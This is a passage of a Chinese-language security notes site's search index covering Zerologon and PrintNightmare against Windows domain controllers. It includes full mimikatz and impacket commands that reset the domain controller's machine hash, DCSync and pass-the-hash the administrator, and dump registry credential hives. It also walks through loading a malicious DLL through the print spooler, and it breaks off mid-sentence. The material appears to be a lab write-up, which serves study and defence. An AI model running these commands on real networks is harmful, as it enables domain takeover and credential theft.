\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\u68c0\u6d4b\u548c\u5229\u7528\u6a21\u5757\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528 mimikatz \u6765\u68c0\u6d4b\u548c\u5229\u7528\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1_1","title":"\uff081\uff09\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e","text":"<p>\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u68c0\u6d4b\u76ee\u6807\u57df\u63a7\u662f\u5426\u5b58\u5728 Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e.</p> <pre><code>mimikatz.exe \"privilege::debug\" \"lsadump::zerologon /target:10.211.55.4 /account:AD01$\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u68c0\u6d4b\u76ee\u6807\u57df\u63a7\u662f\u5426\u5b58\u5728 Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u63d0\u793a <code>Authentication: OK -- vulnerable.</code>\u5373\u53ef\u8bc1\u660e\u76ee\u6807\u57df\u63a7\u5b58\u5728 Netlogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2_1","title":"\uff082\uff09\u91cd\u7f6e\u57df\u63a7\u54c8\u5e0c","text":"<p>\u8fd9\u91cc\u91cd\u7f6e\u57df\u63a7\u54c8\u5e0c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\u3002</p> <p>\u2022 \u4e00\u79cd\u60c5\u51b5\u662f\u5f53\u524d\u6267\u884c mimikatz \u7684\u673a\u5668\u5728\u57df\u5185\u3002</p> <p>\u2022 \u4e00\u79cd\u60c5\u51b5\u662f\u5f53\u524d\u6267\u884c mimikatz \u7684\u673a\u5668\u4e0d\u5728\u57df\u5185\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1_2","title":"1\uff09\u653b\u51fb\u673a\u5728\u57df\u4e2d","text":"<p>\u5982\u679c\u5f53\u524d\u4e3b\u673a\u5728\u57df\u73af\u5883\u4e2d\u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u91cd\u7f6e\u57df\u63a7 AD01 \u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\uff0ctarget \u53c2\u6570\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 FQDN\uff0c\u4e5f\u5c31\u662f AD01.xie.com\u3002</p> <pre><code>mimikatz.exe \"lsadump::zerologon /target:AD01.xie.com /ntlm /null /account:AD01$ /exploit\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u91cd\u7f6e\u57df\u63a7 AD01 \u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\u4e3a 0 \u6210\u529f</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2_2","title":"2\uff09\u653b\u51fb\u673a\u4e0d\u5728\u57df\u4e2d","text":"<p>\u5982\u679c\u5f53\u524d\u4e3b\u673a\u4e0d\u5728\u57df\u73af\u5883\u4e2d\u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u91cd\u7f6e\uff0ctarget \u53c2\u6570\u8fd9\u91cc\u9700\u8981\u6307\u5b9a\u57df\u63a7\u7684 ip\u3002</p> <pre><code>mimikatz.exe \"lsadump::zerologon /target:10.211.55.4 /ntlm /null /account:AD01$ /exploit\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u91cd\u7f6e\u57df\u63a7 10.211.55.4 \u7684\u673a\u5668\u8d26\u53f7\u54c8\u5e0c\u4e3a 0 \u6210\u529f\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3_2","title":"\uff083\uff09\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7","text":"<p>\u8fd9\u91cc\u4f7f\u7528 mimikatz \u5229\u7528 DCSync \u5bfc\u51fa\u54c8\u5e0c\u7684\u8fc7\u7a0b\u9700\u8981\u6ce8\u610f\uff0c\u7531\u4e8e/dc \u53c2\u6570\u540e\u9762\u8981\u8ddf\u57df\u540d\u683c\u5f0f\u7684 FQDN\u3002\u56e0\u6b64\u5982\u679c\u5f53\u524d\u673a\u5668\u4e0d\u5728\u57df\u5185\u7684\u8bdd\uff0c\u9700\u8981\u5c06\u5f53\u524d\u673a\u5668\u7684DNS \u6307\u5b9a\u4e3a\u57df\u63a7\uff0c\u8fd9\u6837\u624d\u80fd\u89e3\u6790\u3002\u5982\u679c\u5f53\u524d\u673a\u5668\u5728\u57df\u5185\u7684\u8bdd\uff0c\u5219\u4e0d\u7528\u4efb\u4f55\u914d\u7f6e\uff0c\u9ed8\u8ba4\u5373\u53ef</p> <p>\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u5148\u5bfc\u51fa\u57df\u7ba1\u7406\u5458 administrator \u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u7136\u540e\u4f7f\u7528\u57df\u7ba1\u7406\u5458 administrator \u7684\u5bc6\u7801\u54c8\u5e0c\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\uff01</p> <pre><code>#\u5bfc\u51fa\u6307\u5b9a administrator \u7528\u6237\u54c8\u5e0c\nmimikatz.exe \"lsadump::dcsync /csv /domain:xie.com /dc:AD01.xie.com /user:administrator /authuser:AD01$ /authpassword:\\\"\\\" /authntlm\" \"exit\"\nlsadump::dcsync /domain:xie.com /dc:AD01.xie.com /user:administrator /authuser:AD01$ /authpassword:\"\" /authntlm\n\n#\u7136\u540e\u7528 administrator \u7528\u6237\u7684\u54c8\u5e0c\u8fde\u63a5\u57df\u63a7\uff0c\u8fd9\u4e00\u6b65\u9700\u8981 privilege::debug \u63d0\u6743\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:10.211.55. 4 /rc4:33e17aa21ccc6ab0e6ff30eecb918dfb\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u5bfc\u51fa\u57df\u7ba1\u7406\u5458 administrator \u7684\u54c8\u5e0c\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528\u57df\u7ba1\u7406\u5458\u54c8\u5e0c\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u8bbf\u95ee\u57df\u63a7 AD01\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3_3","title":"3.\u6062\u590d\u57df\u63a7\u7684\u673a\u5668\u7528\u6237\u54c8\u5e0c","text":"<p>\u5728\u653b\u51fb\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5c06\u57df\u63a7\u673a\u5668\u8d26\u53f7\u7684\u54c8\u5e0c\u7f6e\u4e3a\u7a7a\u4e86\u3002\u6b64\u65f6\uff0c\u57df\u63a7\u673a\u5668\u8d26\u53f7\u5728\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u5bc6\u7801\u548c\u57df\u63a7\u672c\u5730\u6ce8\u518c\u8868\u4ee5\u53ca lsass \u8fdb\u7a0b\u4e2d\u7684\u5bc6\u7801\u4e0d\u4e00\u81f4\uff0c\u8fd9\u5c06\u5bfc\u81f4\u57df\u63a7\u91cd\u542f\u540e\u65e0\u6cd5\u5f00\u673a\u3001\u8131\u57df\u7b49\u60c5\u51b5\uff01\u56e0\u6b64\uff0c\u6211\u4eec\u5f97\u60f3\u529e\u6cd5\u8ba9\u57df\u63a7\u5728\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u5bc6\u7801\u548c\u5728\u57df\u63a7\u672c\u5730\u6ce8\u518c\u8868\u4ee5\u53ca lsass \u8fdb\u7a0b\u4e2d\u7684\u5bc6\u7801\u4e00\u81f4\uff01</p> <p>\u8fd9\u91cc\u6709\u4e24\u79cd\u65b9\u6848\uff1a</p> <ul> <li>\u4e00\u79cd\u65b9\u6848\u662f\u83b7\u5f97\u57df\u63a7\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb\u54c8\u5e0c\uff0c\u7136\u540e\u5c06\u5176\u6062\u590d\u5230\u539f\u59cb\u54c8\u5e0c\u3002</li> <li>\u53e6\u4e00\u79cd\u65b9\u6848\u662f\u4f7f\u7528 powershell \u547d\u4ee4\u91cd\u7f6e\u57df\u63a7\u5728\u6d3b\u52a8\u76ee\u5f55\u3001\u672c\u5730\u6ce8\u518c\u8868\u548c lsass \u8fdb\u7a0b\u4e2d\u7684\u54c8\u5e0c\uff0c\u4f7f\u4e09\u8005\u4e00\u81f4\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1_3","title":"\uff081\uff09\u83b7\u5f97\u57df\u63a7\u673a\u5668\u8d26\u53f7\u539f\u59cb\u54c8\u5e0c","text":"<p>\u83b7\u5f97\u57df\u63a7\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb\u54c8\u5e0c\u6709\u5982\u4e0b\u51e0\u79cd\u65b9\u6cd5\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#1_4","title":"1\uff09\u65b9\u5f0f\u4e00","text":"<p>\u5728\u76ee\u6807\u57df\u63a7\u4e0a\u6267\u884c\u5982\u4e0b\u4e09\u4e2a\u547d\u4ee4\uff0c\u5c06\u6ce8\u518c\u8868\u4e2d\u7684\u4fe1\u606f\u5bfc\u51fa\u6210\u4e09\u4e2a\u6587\u4ef6\u3002</p> <pre><code>reg save HKLM\\SYSTEM system.save\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SECURITY security.save\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 reg \u547d\u4ee4\u5c06\u57df\u63a7\u6ce8\u518c\u8868\u4e2d\u7684\u4fe1\u606f\u5bfc\u51fa\u6210\u6587\u4ef6\u3002</p> <p></p> <p>\u5c06\u521a\u521a\u4fdd\u5b58\u7684\u4e09\u4e2a\u6587\u4ef6\u653e\u5230 impacket \u7684 examples \u76ee\u5f55\u4e0b\uff0c\u4f7f\u7528secretsdump.py \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u63d0\u53d6\u51fa\u6587\u4ef6\u91cc\u9762\u7684 hash\u3002</p> <pre><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 secretsdump.py \u811a\u672c\u63d0\u53d6\u51fa\u6587\u4ef6\u91cc\u9762\u7684 hash\uff0c$MACHINE.ACC \u540e\u9762\u7684 37945b4d7e794816622f47aa8e3b60b8 \u5c31\u662f\u539f\u6765\u7684\u673a\u5668\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2_3","title":"2\uff09\u65b9\u5f0f\u4e8c","text":"<p>\u4f7f\u7528 mimikatz \u7684 <code>sekurlsa::logonpassword</code> \u6a21\u5757\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u4ece lsass.exe\u8fdb\u7a0b\u91cc\u9762\u6293\u53d6\u57df\u63a7\u673a\u5668\u8d26\u53f7 AD01$\u7684\u539f\u59cb\u54c8\u5e0c</p> <pre><code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u6293\u53d6\u7684\u57df\u63a7\u673a\u5668\u8d26\u53f7 AD01$\u7684\u539f\u59cb\u54c8\u5e0c\u4e3a37945b4d7e794816622f47aa8e3b60b8\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3_4","title":"3\uff09\u65b9\u5f0f\u4e09","text":"<p>\u4f7f\u7528 secretsdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u542f\u7528<code>\u5377\u5f71\u590d\u5236\u670d\u52a1 volume shadow copy \uff08VSS\uff09</code>\u5bfc\u51fa\u57df\u5185\u6240\u6709\u54c8\u5e0c\uff0c\u8fd9\u5176\u4e2d\u5c31\u5305\u542b\u57df\u5185\u673a\u5668\u8d26\u53f7\u7684\u54c8\u5e0c\u3002</p> <pre><code>python3 secretsdump.py xie.com/administrator@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:33e17aa21ccc6ab0e6ff30eecb918dfb -use-vss\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 secretsdump.py \u811a\u672c\u5bfc\u51fa\u57df\u5185\u6240\u6709\u54c8\u5e0c\uff0c\u53ef\u4ee5\u770b\u5230 AD01$\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb\u54c8\u5e0c\u4e3a 37945b4d7e794816622f47aa8e3b60b8\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#2_4","title":"\uff082\uff09\u6062\u590d\u57df\u63a7\u539f\u59cb\u54c8\u5e0c","text":"<p>\u4f7f\u7528\u4e86\u4e0a\u9762\u7684\u65b9\u6cd5\u83b7\u5f97\u4e86\u57df\u63a7\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb\u54c8\u5e0c\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528reinstall_original_pw.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u6062\u590d\u57df\u63a7\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb\u54c8\u5e0c\u3002\u8be5\u811a\u672c\u5728\u8ba1\u7b97\u5bc6\u7801\u7684\u65f6\u5019\u4f7f\u7528\u4e86\u7a7a\u5bc6\u7801\u7684\u54c8\u5e0c\u53bb\u8ba1\u7b97 session_key\uff0c\u7136\u540e\u6307\u5b9a\u673a\u5668\u8d26\u53f7\u7684\u539f\u59cb NTLM \u54c8\u5e0c\u5373\u53ef\u8fd8\u539f\u3002</p> <pre><code>#\u6062\u590d\u57df\u63a7\u54c8\u5e0c\npython3 reinstall_original_pw.py AD01 10.211.55.4 37945b4d7e794816622f47aa8e3b60b8\n</code></pre> <p>\u6062\u590d\u6210\u529f\u540e\uff0c\u4f7f\u7528 secretsdump.py \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u57df\u63a7 AD01 \u7684\u673a\u5668\u8d26\u53f7AD01$\u7684\u54c8\u5e0c\u6765\u786e\u8ba4\u662f\u5426\u6062\u590d\u5b8c\u6210\u3002</p> <pre><code>python3 secretsdump.py xie.com/administrator@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:33e17aa21ccc6ab0e6ff30eecb918dfb -just-dc-user \" AD01$\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u57df\u63a7\u673a\u5668\u8d26\u53f7 AD01 \u7684\u54c8\u5e0c\u6062\u590d\u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article3/index.html#3powershell","title":"\uff083\uff09powershell \u547d\u4ee4\u91cd\u7f6e\u54c8\u5e0c","text":"<p>\u4e5f\u76f4\u63a5\u5728\u57df\u63a7\u4e0a\u6267\u884c\u5982\u4e0b powershell \u547d\u4ee4\uff0c\u8be5\u547d\u4ee4\u4f1a\u91cd\u7f6e\u8ba1\u7b97\u673a\u7684\u673a\u5668\u5e10\u6237\u5bc6\u7801\u3002\u91cd\u7f6e\u540e\uff0c\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\uff0c\u6ce8\u518c\u8868\uff0clsass \u8fdb\u7a0b\u91cc\u9762\u7684\u5bc6\u7801\u5747\u4e00\u81f4\u3002\u4f46\u662f\u91cd\u7f6e\u540e\u7684\u5bc6\u7801\u4e0e\u4e4b\u524d\u7684\u539f\u59cb\u5bc6\u7801\u4e0d\u4e00\u81f4\u3002</p> <pre><code>powershell Reset-ComputerMachinePassword\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html","title":"Windows Print Spooler \u6743\u9650\u63d0\u5347 \u6f0f\u6d1e PrintNightmare","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u672c\u6587\u6240\u8bf4\u7684\u6f0f\u6d1e\u662f CVE-2021-34527(PrintNightmare)\u6f0f\u6d1e.</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>Print Spooler \u662f Windows \u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u6253\u5370\u76f8\u5173\u4e8b\u52a1\u7684\u670d\u52a1\uff0c\u5728Windows \u7cfb\u7edf\u4e2d\u7528\u4e8e\u540e\u53f0\u6267\u884c\u6253\u5370\u4f5c\u4e1a\u5e76\u5904\u7406\u4e0e\u6253\u5370\u673a\u7684\u4ea4\u4e92\uff0c\u8be5\u670d\u52a1\u7ba1\u7406\u6240\u6709\u672c\u5730\u548c\u7f51\u7edc\u6253\u5370\u961f\u5217\u53ca\u63a7\u5236\u6240\u6709\u6253\u5370\u5de5\u4f5c\u3002\u8be5\u670d\u52a1\u5bf9\u5e94\u7684\u8fdb\u7a0b <code>spoolsv.exe</code> \u4ee5SYSTEM \u6743\u9650\u6267\u884c\u3002\u5176\u8bbe\u8ba1\u4e2d\u5b58\u5728\u7684\u4e00\u4e2a\u4e25\u91cd\u7f3a\u9677\uff0c\u7531\u4e8e <code>SeLoadDriverPrivilege</code>\u4e2d\u9274\u6743\u5b58\u5728\u4ee3\u7801\u7f3a\u9677\uff0c\u53c2\u6570\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u63a7\u5236\uff0c\u666e\u901a\u7528\u6237\u53ef\u4ee5\u901a\u8fc7 RPC \u89e6\u53d1<code>RpcAddPrinterDrive</code> \u7ed5\u8fc7\u5b89\u5168\u68c0\u67e5\u5e76\u5199\u5165\u6076\u610f\u9a71\u52a8\u7a0b\u5e8f\u3002\u5982\u679c\u57df\u63a7\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u57df\u4e2d\u666e\u901a\u7528\u6237\u5373\u53ef\u901a\u8fc7\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7 Spooler \u670d\u52a1\uff0c\u5411\u57df\u63a7\u4e2d\u6dfb\u52a0\u6076\u610f\u9a71\u52a8\uff0c\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u57df\u73af\u5883\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 spoolsv.exe \u8fdb\u7a0b\u9ed8\u8ba4\u662f\u8fd0\u884c\u7740\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 spoolsv.exe \u8fdb\u7a0b\u5bf9\u5e94\u7684 Spooler \u670d\u52a1\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#1","title":"1.\u6f0f\u6d1e\u6210\u56e0\u5206\u6790","text":"<p>\u6f0f\u6d1e\u4ea7\u751f\u7684\u6839\u672c\u539f\u56e0\u5982\u56fe\u6240\u793a IDA \u4f2a\u4ee3\u7801\uff1a</p> <p></p> <p><code>ValiadteObjectAccess</code> \u662f\u6253\u5370\u673a\u670d\u52a1\u7528\u6765\u8fdb\u884c\u7ba1\u7406\u5458\u6743\u9650\u68c0\u67e5\u7684\u51fd\u6570\uff0c\u4f46\u5728\u8c03\u7528\u8be5\u51fd\u6570\u8fdb\u884c\u6743\u9650\u68c0\u67e5\u4e4b\u524d\uff0c\u6253\u5370\u673a\u670d\u52a1\u4f1a\u9996\u5148\u68c0\u67e5\u7528\u6237\u4f20\u5165\u7684 a4 \u7684\u503c\uff0c\u5f53\u8be5\u503c\u6ee1\u8db3\uff1a<code>_bittest(&amp;a4,0xf) == 0</code> \u65f6\uff0c\u6743\u9650\u68c0\u67e5\u51fd\u6570\u5c06\u4e0d\u4f1a\u88ab\u8c03\u7528\uff0c\u7531\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u666e\u901a\u7528\u6237\u8eab\u4efd\u52a0\u8f7d\u6076\u610f\u6253\u5370\u673a\u9a71\u52a8\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article4/index.html#2","title":"2.\u6f0f\u6d1e\u5229\u7528\u5206\u6790","text":"<p>\u5728\u7ed5\u8fc7\u5b89\u5168\u68c0\u67e5\u4e4b\u540e\uff0c\u8be5\u51fd\u6570\u5c06\u4f1a\u89e3\u6790\u6211\u4eec\u4f20\u5165\u7684<code>DRIVER_INFO_2</code> \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7684\u5b9a\u4e49\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u4e09\u4e2a\u53c2\u6570\uff0c\u5e76\u5c06\u4ed6\u4eec\u547d\u540d\u4e3a A B C\uff0c\u65b9\u4fbf\u6211\u4eec\u540e\u7eed\u7684\u5206\u6790\u3002</p> <p>pConfigFile = A pDataFile = B pDriverPath = C</p> <p>\u901a\u8fc7\u5bf9\u51fd\u6570<code>RpcAddPrinterDriver</code> \u7684\u9006\u5411\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u6dfb\u52a0\u6253\u5370\u673a\u9a71\u52a8\u7684\u884c\u4e3a\u8fdb\u884c\u4e00\u4e2a\u7b80\u7565\u603b\u7ed3\u3002\u9996\u5148\u6253\u5370\u673a\u670d\u52a1\u4f1a\u5c06 A B C \u4e09\u4e2a\u6587\u4ef6\u5168\u90e8\u62f7\u5165<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\new</code> \u76ee\u5f55\u4e0b\uff0c\u968f\u540e\u518d\u6b21\u5c06\u4ed6\u4eec\u62f7\u8d1d\u81f3 <code>C:\\Windows\\System32\\spool\\drivers\\x64\\3</code> \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u5c06\u4f1a\u52a0\u8f7d<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\A</code>\u548c<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\C</code>\uff0c\u5982\u679c\u653b\u51fb\u8005\u80fd\u63a7\u5236 A \u548c C\uff0c\u90a3\u4e48\u5c31\u80fd\u8f7b\u6613\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\u3002\u4f46\u4e8b\u5b9e\u4e0a\uff0c\u6253\u5370\u673a\u670d\u52a1\u4f1a\u8c03\u7528 <code>ValidateDriverInfo</code> \u51fd\u6570\u5bf9\u7528\u6237\u4f20\u5165\u7684\u9a71\u52a8\u4fe1\u606f\u8fdb\u884c\u68c0\u67e5\uff0c\u8be5\u51fd\u6570\u9650\u5236\u4e86 A C \u5fc5\u987b\u662f\u4f4d\u4e8e\u672c\u5730\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u4f46\u6ca1\u6709\u68c0\u67e5 B \u6587\u4ef6\u662f\u5426\u4e3a\u672c\u5730\u6587\u4ef6\u3002\u540c\u65f6\u6253\u5370\u673a\u670d\u52a1\u4f1a\u5bf9 C \u7684\u6587\u4ef6\u5b8c\u6574\u6027\u8fdb\u884c\u6821\u9a8c\uff0c\u786e\u4fdd\u5176\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u6253\u5370\u673a\u9a71\u52a8\u6587\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u65e0\u6cd5\u5c06\u5176\u7b80\u5355\u7684\u8bbe\u7f6e\u4e3a\u4efb\u610f\u7684 DLL \u6587\u4ef6\uff0c\u4f46\u8be5\u6587\u4ef6\u4e0d\u4f1a\u5bf9\u6f0f\u6d1e\u5229\u7528\u4ea7\u751f\u5f71\u54cd\uff0c\u6211\u4eec\u53ea\u9700\u8981\u7b80\u5355\u7684\u5c06\u5176\u8bbe\u7f6e\u4e3a\u672c\u673a\u4e0a\u7684\u4e00\u4e2a\u5408\u6cd5\u6253\u5370\u673a\u9a71\u52a8\u6587\u4ef6\u5373\u53ef\uff0c<code>C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL</code> \u4fbf\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u4f8b\u5b50\u3002</p> <p>\u4e00\u4e2a\u663e\u800c\u6613\u89c1\u7684\u5229\u7528\u601d\u8def\u4e3a\u8c03\u7528\u4e24\u6b21 <code>RpcAddPrinterDriver</code>\uff1a</p> <ul> <li>\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\uff0c\u4f7f\u7528 UNC \u8def\u5f84\u6307\u5b9a B \u4e3a\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684\u6587\u4ef6\uff0c\u5982<code>\\10.211.55.7\\share\\Evil.dll</code>\u3002Evil.dll \u5c06\u4f1a\u88ab\u62f7\u8d1d\u81f3<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll</code>\u3002</li> <li>\u7b2c\u4e8c\u6b21\u8c03\u7528\u65f6\uff0c\u6307\u5b9a A \u4e3a<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll</code>\u3002</li> <li>\u7406\u8bba\u4e0a\uff0c<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll</code> \u5c06\u4f1a\u88ab\u52a0\u8f7d\u3002</li> </ul> <p>\u4f46\u4e8b\u5b9e\u4e0a\uff0c\u8be5\u5229\u7528\u601d\u8def\u5728\u4f1a\u7b2c\u4e8c\u6b21\u8c03\u7528 RpcAddPrinterDriver \u4ea7\u751f\u4e00\u4e2a\u8bbf\u95ee\u51b2\u7a81\u7684\u9519\u8bef\uff0cRpcAddPrinterDriver \u4f1a\u5c06\u7528\u6237\u4f20\u5165\u7684 DLL \u6587\u4ef6\u8fdb\u884c\u4e24\u6b21\u62f7\u8d1d\uff0c\u8be5\u8fc7\u7a0b\u53ef\u4ee5\u7528\u5982\u4e0b\u8868\u793a\uff1a</p> <p>A :<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll</code> B : <code>XXX.DLL</code> C : <code>C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL</code></p> <p>\u7b2c\u4e00\u6b21\u62f7\u8d1d <code>CopyFile( C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll , C:\\Windows\\System32\\spool\\drivers\\x64\\3\\new\\Evil.dll )</code> \u7b2c\u4e8c\u6b21\u62f7\u8d1d <code>CopyFile( C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll , C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Evil.dll )</code></p> <p>\u53ef\u4ee5\u53d1\u73b0\u5f53 A.dll \u7b2c\u4e8c\u6b21\u88ab\u62f7\u8d1d\u65f6\uff0c\u4f1a\u4ea7\u751f\u62f7\u8d1d\u7684\u6e90\u6587\u4ef6\u4e0e\u76ee\u6807\u6587\u4ef6\u76f8\u540c\u7684\u60c5\u51b5\uff0c\u8fd9\u5c06\u5bfc\u81f4\u4e24\u6b21\u6253\u5f00\u6587\u4ef6\u53e5\u67c4\u7684\u64cd\u4f5c\u4f5c\u7528\u4e8e\u76f8\u540c\u6587\u4ef6\uff0c\u7b2c\u4e00\u6b21\u4ee5\u8bfb\u6743\u9650\uff0c\u7b2c\u4e8c\u6b21\u4ee5\u5199\u6743\u9650\uff0c\u8fd9\u5c06\u4ea7\u751f\u4e00\u4e2a\u8bbf\u95ee\u51b2\u7a81\u7684\u95ee\u9898\uff0c\u5bfc\u81f4\u5229\u7528\u5931\u8d25\uff0c\u540c\u7406\u5f53 A \u88ab\u6307\u5b9a\u4e3a<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\new\\Evil.dll</code>\u65f6\uff0c\u4e5f\u4f1a\u5728\u7b2c\u4e00\u6b21\u62f7\u8d1d\u65f6\u4ea7\u751f\u8bbf\u95ee\u51b2\u7a81\u7684\u95ee\u9898\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5c06 A \u6216 C \u6307\u5b9a\u4e3a<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3</code>\u548c<code>C:\\Windows\\System32\\spool\\drivers\\x64\\3\\New</code> 